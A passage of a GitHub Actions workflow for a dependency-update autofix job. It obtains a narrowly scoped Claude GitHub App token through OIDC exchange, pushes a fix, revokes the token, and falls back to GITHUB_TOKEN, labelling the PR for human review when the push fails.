          if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
            TRAIL='as the Claude GitHub App: no OIDC token (this job needs `id-token: write`)'
          elif ! OIDC=$(curl -sS --fail-with-body -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
                 "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=claude-code-github-action" 2>&1); then
            TRAIL="as the Claude GitHub App: the OIDC request failed: $OIDC"
          else
            OIDC=$(printf '%s' "$OIDC" | jq -r '.value // empty' 2>/dev/null || true)
            echo "::add-mask::$OIDC"
            exchange() { # "$@" = extra curl arguments; sets EXCHANGED and APP_TOKEN
              if EXCHANGED=$(curl -sS --fail-with-body -X POST -H "Authorization: Bearer $OIDC" "$@" \
                   https://api.anthropic.com/api/github/github-app-token-exchange 2>&1); then
                APP_TOKEN=$(printf '%s' "$EXCHANGED" | jq -r '.token // .app_token // empty' 2>/dev/null || true)
              fi
              [ -n "$APP_TOKEN" ]
            }
            # Scoped to what a push needs, asked for the way claude-code-action
            # asks for a scope, and retried the way it retries: a blip here
            # would otherwise cost the fix its CI run.
            SCOPE='contents: write'
            for ATTEMPT in 1 2 3; do
              exchange -H 'Content-Type: application/json' --data '{"permissions":{"contents":"write"}}' && break
              [ "$ATTEMPT" -lt 3 ] && sleep $((ATTEMPT * 2))
            done
            # An endpoint that will not narrow the token still grants its
            # default scope, the one every claude-code-action run here holds.
            if [ -z "$APP_TOKEN" ]; then
              NARROW_REFUSAL=$EXCHANGED
              if exchange; then
                SCOPE="the exchange's default scope, since it would not narrow the token to contents: write ($NARROW_REFUSAL)"
              fi
            fi
            if [ -n "$APP_TOKEN" ]; then
              echo "::add-mask::$APP_TOKEN"
              echo "Got the Claude GitHub App's token for this push, scoped to $SCOPE."
            else
              TRAIL="as the Claude GitHub App: the token exchange failed: $EXCHANGED"
            fi
          fi
          if [ -n "$APP_TOKEN" ]; then
            APP_BASIC=$(basic_for "$APP_TOKEN")
            echo "::add-mask::$APP_BASIC"
            if OUT=$(push_with "$APP_BASIC"); then PUSHED_WITH=app; else TRAIL="as the Claude GitHub App: $OUT"; fi
            # Its one use is over; it does not outlive the push.
            curl -sS -o /dev/null -X DELETE -H "Authorization: Bearer $APP_TOKEN" \
              "${GITHUB_API_URL:-https://api.github.com}/installation/token" 2>/dev/null || true
          fi
          if [ -z "$PUSHED_WITH" ]; then
            WORKFLOW_BASIC=$(basic_for "$WORKFLOW_TOKEN")
            echo "::add-mask::$WORKFLOW_BASIC"
            if OUT=$(push_with "$WORKFLOW_BASIC"); then
              PUSHED_WITH=workflow
            else
              TRAIL=$(printf '%s\n%s' "$TRAIL" "with GITHUB_TOKEN: $OUT")
            fi
          fi

          case "$PUSHED_WITH" in
            app)
              echo "Pushed the fix as the Claude GitHub App ($REASON); CI starts on it by itself."
              gh pr comment "$PR_NUMBER" --repo "$REPO" --body "dep-steward autofix pushed a mechanical fix for this bump ($REASON). CI is now running on the fix; when it is green, review and merge."
              ;;
            workflow)
              echo "Pushed the fix with GITHUB_TOKEN ($REASON)."
              # A GITHUB_TOKEN push starts no CI run, so the fix commit has no
              # status and the PR's required check blocks the merge until a
              # person runs CI on it: closing and reopening the PR, or pushing
              # any commit, is a pull_request event from a person. "Re-run" in the
              # UI would only replay the pre-fix commit, so it can't be used here.
              gh pr comment "$PR_NUMBER" --repo "$REPO" --body "dep-steward autofix pushed a mechanical fix for this bump ($REASON). GitHub doesn't run CI on a workflow-pushed commit, so to check the fix: **close and reopen this PR** (or push any commit to its branch). When CI is green, review and merge. (dep-steward could not push it as the Claude GitHub App, so CI did not start by itself; the autofix run's log says why.)"
              # Red: the fix is out, but the push that starts CI failed.
              echo "::error::dep-steward could not push the fix as the Claude GitHub App, so it went out with GITHUB_TOKEN and CI will not start by itself."
              printf '%s\n' "$TRAIL"
              exit 1
              ;;
            *)
              echo "::error::Could not push the fix to $HEAD_BRANCH with any token:"
              printf '%s\n' "$TRAIL"
              # The fixer's own comment says it fixed something, so silence here
              # would leave a false claim standing. Once per PR, like every other
              # escalation in this job.
              if gh pr view "$PR_NUMBER" --repo "$REPO" --json labels --jq '.labels[].name' 2>/dev/null | grep -qxF 'needs-human-review'; then
                echo "PR #$PR_NUMBER is already labelled needs-human-review, so not commenting again."
              else
                gh pr comment "$PR_NUMBER" --repo "$REPO" --body "$(printf '%s\n' \
                  '## dep-steward drafted a fix but could not push it' \
                  '' \
                  "The fix was within the safe bounds ($REASON), but GitHub refused the push:" \
                  '' \
                  '```' \
                  "$TRAIL" \
                  '```' \
                  '' \
                  'Nothing was pushed, so this PR waits for a person.')" || true
                gh pr edit "$PR_NUMBER" --repo "$REPO" --add-label needs-human-review --add-assignee octocat || true
              fi
              exit 1
              ;;
          esac
